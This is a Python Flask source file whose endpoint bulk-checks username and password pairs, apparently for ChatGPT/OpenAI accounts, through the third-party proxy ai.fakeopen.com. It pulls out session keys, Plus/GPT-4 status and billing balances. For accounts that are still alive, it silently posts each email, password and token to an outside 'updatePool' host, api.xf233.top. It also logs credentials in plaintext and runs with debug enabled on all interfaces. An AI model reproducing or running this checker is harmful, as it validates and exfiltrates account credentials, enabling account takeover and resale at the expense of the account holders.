from flask import Flask, render_template, request, jsonify
import requests

import json
import datetime
import time


app = Flask(__name__)


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/health', methods=['GET'])
def health_check():
    # 在这里进行健康检查逻辑，例如检查数据库连接、第三方服务等

    # 如果一切正常，返回一个成功的响应
    return jsonify(status='ok')


@app.route('/ip')
def get_public_ip():
    response = requests.get('https://api.ipify.org')
    return response.text


print("本地服务器IP:" + get_public_ip())


@app.route('/get_sess_key', methods=['POST'])
def get_sess_key():

    try:

        data = request.get_json()
        # print(data)
        # This should be a list of objects
        user_data_list = data['userData']
        batch_size = 1  # Number of items to process in each batch

        results = []
        for i in range(0, len(user_data_list), batch_size):
            batch = user_data_list[i:i+batch_size]
            batch_results = []
            for item in user_data_list:
                username = item['username']
                password = item['password']
                print(f"{username}----{password}")

                # 获取access token -- fakeopen
                url = "https://ai.fakeopen.com/auth/login"
                headers = {
                    'Content-Type': 'application/json'
                }
                payload = {
                    'username': username,
                    'password': password,
                }
                response = requests.post(url, data=payload)
                print("获取access_token")
                print(response.text)
                token_data = json.loads(response.text)
                if token_data['access_token']:
                    headers = {
                        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
                    }
                    # print(token_data['access_token'])
                    data = {
                        'unique_name': 'FK',
                        'access_token': token_data['access_token'],
                        'expires_in': '0',
                        'site_limit': '',
                    }
                    fk_response = requests.post(
                        'https://ai.fakeopen.com/token/register', headers=headers, data=data)
                    fk_data = json.loads(fk_response.text)
                    print("获取fk")
                    print(fk_data)

                    fk_token = fk_data['token_key']
                    # print(fk_token)

                    # 判断models是否存活
                    models_access_headers = {
                        'Content-Type': 'application/json',
                        'Authorization': "Bearer " + token_data['access_token']
                    }
                    print(models_access_headers)

                    resp = requests.get(
                        "https://ai.fakeopen.com/api/models", headers=models_access_headers)
                    # print(resp.text)
                    # print(resp.status_code)
                    if resp.status_code == 200:
                        data = resp.json()
                        # print(data)
                        for i in data['models']:
                            # print(i)
                            if 'slug' in i.keys():
                                print("account alive")
                                up_load_headers = {
                                    'Content-Type': 'application/json'
                                }
                                updatePool_data = [
                                    {
                                        'email': username,
                                        'password': password,
                                        'fk_token': fk_token
                                    },
                                ]
                                print(updatePool_data)
                                response = requests.post(
                                    'https://api.xf233.top/api/updatePool', headers=up_load_headers, json=updatePool_data)
                                print(response.text)
                                break
                # print(token_data)
                access_token = token_data['access_token']
                # print(access_token)

                access_headers = {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + access_token
                }
                print(access_headers)
                api_prefix = 'https://ai.fakeopen.com'

                time.sleep(1)

                # 获取platform
                plat_payload = {
                    'username': username,
                    'password': password,
                    'prompt': "login"
                }

                resp = requests.post(
                    "https://ai.fakeopen.com/auth/platform/login", headers=headers, data=plat_payload)
                print(resp.text)
                result = {}  # Initialize the result dictionary
                print(resp.text)
                data = resp.json()
                # print(data)

                # print('==================== 以下为账号SESS信息 ====================')
                if resp.status_code == 200 and (resp.json())['login_info']['user'] is not None and (resp.json())['login_info']['user'] != '':
                    # data = resp.json()
                    sess_key = data['login_info']['user']['session']['sensitive_id']
                    org_id = data['login_info']['user']['orgs']['data'][0]['id']
                    print(sess_key)
                    headers = {
                        "Authorization": "Bearer " + sess_key,
                        "Content-Type": "application/json"
                    }

                    # print('==================== 判断账号plus信息 ====================')
                    url = '{}/api/models'.format(api_prefix)
                    resp = requests.get(url, headers=access_headers)
                    is_plus = False
                    if resp.status_code == 200:
                        data = resp.json()
                        # print(data)
                        for i in data['models']:
                            # print(i)
                            if 'gpt-4' in i.values():
                                # print("account have plus...")
                                is_plus = True
                                break
                    else:
                        print('账号plus信息获取失败\n')
                        is_plus = None

                    # print('==================== 以下为账号订阅信息 ====================')

                    url = '{}/dashboard/billing/subscription'.format(
                        api_prefix)
                    resp = requests.get(url, headers=headers)
                    # print(resp.text)
                    if resp.status_code == 200:
                        print(resp.text)
                        data = resp.json()
                        total = data['hard_limit_usd']
                        account_type = data['plan']['id']
                        # print(account_type)
                        if data['access_until'] == None:
                            expiry_time = None
                        else:
                            account_data = datetime.datetime.utcfromtimestamp(
                                data['access_until'])
                            # print(account_data)
                            expiry_time = account_data.strftime("%Y-%m-%d")
                        billing_mechanism = data['billing_mechanism']
                        # print(billing_mechanism)
                        if billing_mechanism == None:
                            pay_type = "pay_ment"
                        elif billing_mechanism == "arrears":
                            pay_type = "arrears"
                        elif billing_mechanism == "advance":
                            pay_type = "advance"
                        end_date = (datetime.datetime.now() +
                                    datetime.timedelta(days=1)).strftime("%Y-%m-%d")
                        start_date = datetime.datetime.now().strftime("%Y-%m-01")
                        billing_url = '{}/v1/dashboard/billing/usage?start_date={}&end_date={}'.format(
                            api_prefix, start_date, end_date)
                        # print(billing_url)
                        billing_response = requests.get(
                            billing_url, headers=headers)
                        # print(billing_response.text)
                        if billing_response.status_code == 200:
                            data = billing_response.json()
                            # print(data.text)
                            total_usage = data.get("total_usage") / 100
                            total_cost = total - total_usage
                            daily_costs = data.get("daily_costs")
                            days = min(5, len(daily_costs))

                    else:
                        print('账号订阅信息获取失败！\n')

                    url = '{}/dashboard/rate_limits'.format(api_prefix)
                    resp = requests.get(url, headers=headers)
                    if resp.status_code == 200:
                        data = resp.json()
                        if 'gpt-4' in data:
                            is_gpt4 = True
                        else:
                            is_gpt4 = False
                    else:
                        print('账号频控信息获取失败！\n')

                    # print('==================== 结果 ====================')
                    # print(result)
                    result = {
                        'username': username,
                        'password': password,
                        'alive': True,
                        'sess_key': sess_key,
                        'org': org_id,
                        'type': account_type,
                        'plus': is_plus,
                        'gpt4': is_gpt4,
                        'pay_type': pay_type,
                        'granted': f"{total:.2f}",
                        'used': f"{total_usage:.2f}",
                        'available': f"{(total - total_usage):.2f}",
                        'expires_at': expiry_time
                    }

                else:
                    # print(f"Account info: {username}----{password}")
                    err_str = resp.text.replace(
                        '\n', '').replace('\r', '').strip()
                    print('share token failed: {}'.format(err_str))
                    if "scope" not in err_str:
                        result = {
                            'username': username,
                            'password': password,
                            'alive': False,
                            'err': err_str,
                            'org': None,
                            'type': None,
                            'plus': None,
                            'gpt4': None,
                            'granted': None,
                            'pay_type': None,
                            'used': None,
                            'available': None,
                            'expires_at': None
                        }
                    else:
                        # print(data['token_info']['scope'])
                        err_str = data['token_info']['scope']
                        result = {
                            'username': username,
                            'password': password,
                            'alive': False,
                            'err': err_str,
                            'org': None,
                            'type': None,
                            'plus': None,
                            'gpt4': None,
                            'granted': None,
                            'pay_type': None,
                            'used': None,
                            'available': None,
                            'expires_at': None
                        }

                batch_results.append(result)

            results.extend(batch_results)
    except Exception as e:
        print(jsonify({'error': str(e)}))
        # return jsonify({'error': str(e)})

    json_data = json.dumps(results, indent=4)
    # print(json_data)
    print(json.dumps(results, separators=(',', ':')))

    return json_data


if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=8080)
